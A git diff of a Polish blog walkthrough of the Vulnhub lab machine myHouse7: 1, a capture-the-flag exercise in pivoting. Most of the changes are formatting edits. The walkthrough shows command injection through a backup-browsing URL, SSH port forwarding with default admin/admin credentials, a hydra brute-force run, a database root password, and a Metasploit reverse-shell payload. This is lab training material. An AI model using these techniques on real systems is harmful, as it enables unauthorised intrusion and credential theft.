@@ -26,6 +26,15 @@ gallery4_5:
   - url: /assets/images/hacking/2021/09/05.png
     image_path: /assets/images/hacking/2021/09/05.png
 ---
+
+|:----|:----|
+|Nazwa:|myHouse7: 1|
+|Autor:|[Thepcn3rd](https://www.vulnhub.com/author/thepcn3rd,608/)|
+|Wypuszczony:|2.11.2018|
+|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/myhouse7-1,286/) - Vulnhub|
+|Poziom:|Łatwy|
+|Nauczysz się:|Pivoting|
+
 # Wstęp
 Ostatnio szukałem czegoś, gdzie mógłbym zastosować Pivoting (dostać się na serwer, który jest za serwerem atakowanym). Na serwisie z podatnymi maszynami [Vulnhub](https://www.vulnhub.com/) znalazłem coś takiego: [myHouse7: 1](https://www.vulnhub.com/entry/myhouse7-1,286/). Niestety ta maszyna może się uruchomić z błędami, ale do tego są odpowiednie [solucje](https://pwnstorm.tech/myhouse-7-1-capture-the-flag-walkthrough/) jak temu zaradzić. Na XCP-NG jeszcze bardziej jest sprawa skomplikowana (niekompatybilny interfejs). Jak zmienić interfejs, żeby dobrze działał na XCP-NG pisałem już [tutaj](https://kerszl.github.io/hacking/xcp-ng-i-vulnhub/). Jeszcze jedna rada z mojej strony odnośnie **myHouse7**. Kiedy obraz zainstalujecie, to nie odpalajcie go do końca, ale od razu wejdźcie w tryb "awaryjny". Zmieńcie interfejs na eth0 i gdzieś zgrajcie pliki z **/home/bob/setup**. Jak to się źle odpali, to się pokasują pliki do instalacji i trzeba będzie od początku wirtualkę zainstalować. Z tego co pamiętam, to plik **"autostart"** jest w **/etc/rc.local**. A skrypt instalacyjny obrazów **Dockera** jest w **/home/bob/setup/buildDockerNet.sh**. Z moich notatek wynika, że jeżeli coś źle pójdzie, to trzeba skasować **/home/bob/setup/config** i potem uruchomić **./home/bob/setup/buildDockerNet.sh**. Na początku chyba trzeba przerobić sieciówkę na **ETH0** i dopiero potem, jak wszystko jest ok, uruchomić **./home/bob/setup/buildDockerNet.sh**. Niestety nie pamiętam dokładnie jak to było, ale zakładam, że wszystko poszło dobrze i wirtualka wystartowała. Jak już wspomniałem o **Dockerze**, to na maszynie jest 7 działających z niego kontenerów.
 {: .text-justify}
@@ -37,7 +46,7 @@ Mamy przy okazji pierwszą flagę, a jest ich 20 lub 19. Autor to dobrze opisał
 {: .text-justify}
 # Zaczynamy
 Nie będę opisywał skanowania portów, bo już to pewnie doskonale znacie. Napomknę, że na porcie **8115** jest zainstalowany
-[Anchor CMS](https://anchorcms.com/) wersja [0.12.7](https://github.com/anchorcms/anchor-cms/releases/download/0.12.7/anchor-cms-0.12.7-bundled.zip). Możecie ściągnąć sobie kod i zobaczyć, jak to tam wszystko wygląda. Od strony przeglądarki możemy sobie chodzić po katalogach i np. wejść na **http://172.16.1.167:8115/anchor/**. Wszystkie katalogi są takie jak w źródle. To co przykuło moją uwagę, to wpis w pierwszym poście: **/timeclock/backup/**
+[Anchor CMS](https://anchorcms.com/) w wersji [0.12.7](https://github.com/anchorcms/anchor-cms/releases/download/0.12.7/anchor-cms-0.12.7-bundled.zip). Możecie ściągnąć sobie kod i zobaczyć, jak to tam wszystko wygląda. Od strony przeglądarki możemy sobie chodzić po katalogach i np. wejść na **http://172.16.1.167:8115/anchor/**. Wszystkie katalogi są takie jak w źródle. To co przykuło moją uwagę, to wpis w pierwszym poście: **/timeclock/backup/**
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.167:8115/
@@ -47,14 +56,16 @@ Wchodząc na **http://172.16.1.167:8115/timeclock/backup/** dostajemy piękny do
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.167:8115//timeclock/backup/browse_backups.php?cmd=ls%20-lha
-```console
+<pre>
+<p style="background-color:white;">
 total 48K
 drwxrwxrwx 1 root root 4.0K Sep  1 07:29 .
 drwxr-xr-x 1 root root 4.0K Oct 23  2018 ..
 -rw-r--r-- 1 root root  27K Oct 23  2018 all.zip
 -rw-r--r-- 1 root root  190 Oct 23  2018 browse_backups.php
 -rw-r--r-- 1 root root   18 Oct 23  2018 flag.txt
-```
+</p>
+</pre>
 </div>
 
 # Exploit
@@ -267,8 +278,8 @@ tcp            LISTEN          0               244                              
 Widać, że połączanie na 24 porcie jest. Teraz sprawdźmy co się tam kryje:
 {: .text-justify}
 ## SSH
-```console
-root@kali:/home/szikers/myhouse7-1# nmap -sV -p 24 127.0.0.1
+```bash
+# root@kali:/home/szikers/myhouse7-1# nmap -sV -p 24 127.0.0.1
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:03 CEST
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000041s latency).
@@ -281,6 +292,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
 ```
 **SSH** - łamanie czymkolwiek przez *portfwd* to masakra, nie wiem czym to jest spowodowane, więc od razu wejdźmy na **Shella**.
+{: .text-justify}
 ```console
 root@kali:/home/szikers/myhouse7-1# ssh 127.0.0.1 -p 24
 FLAG: {{tryharder:308}}
@@ -301,15 +313,15 @@ root@3325411fbe96:~#
 root@3325411fbe96:~# ls
 flag.txt
 ```
-Ciekawostka jest taka, że nie zawsze mogłem się dobrze połączyć na **Mysql** (o tym później) przez *portfwd* **Metasploita**. Za to bez problemu poszło połączenie przez **SSH** na serwer. Jednak tym sposobem trzeba znać login i hasło. Autor wszystkim to ułatwił: **admin**/**admin**. Pokaże jak to działa. Na jednej konsoli nawiązujemy połączenie:
+Ciekawostka jest taka, że nie zawsze mogłem się dobrze połączyć na **Mysql** (o tym później) przez *portfwd* **Metasploit**a. Za to bez problemu poszło połączenie przez **SSH** na serwer. Jednak tym sposobem trzeba znać login i hasło. Autor wszystkim to ułatwił: **admin**/**admin**. Pokaże jak to działa. Na jednej konsoli nawiązujemy połączenie:
 {: .text-justify}
 ```bash
-ssh -N -L 24:172.31.20.194:24 admin@172.16.1.167
+# ssh -N -L 24:172.31.20.194:24 admin@172.16.1.167
 ```
 a na drugiej łamiemy:
 {: .text-justify}
-```console
-root@kali:/home/szikers/myhouse7-1# hydra -P password.txt -L users.txt 127.0.0.1 -s 24 ssh -vv
+```bash
+# root@kali:/home/szikers/myhouse7-1# hydra -P password.txt -L users.txt 127.0.0.1 -s 24 ssh -vv
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-01 22:00:24
@@ -441,8 +453,8 @@ Ważne żeby na poczatku załadować ładunek **payload/linux/x86/shell_reverse_
 {: .notice--danger}
 Jeżeli wszystko poszło dobrze, to powinniśmy się połączyć na konsolę. Poniżej cały zapis. 
 {: .text-justify}
-```console
-root@kali:/home/szikers# mysql -uroot -panchordb -h 127.0.0.1 -P 3307
+```bash
+# root@kali:/home/szikers# mysql -uroot -panchordb -h 127.0.0.1 -P 3307
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 179
 Server version: 10.3.10-MariaDB-1:10.3.10+maria~bionic-log mariadb.org binary distribution
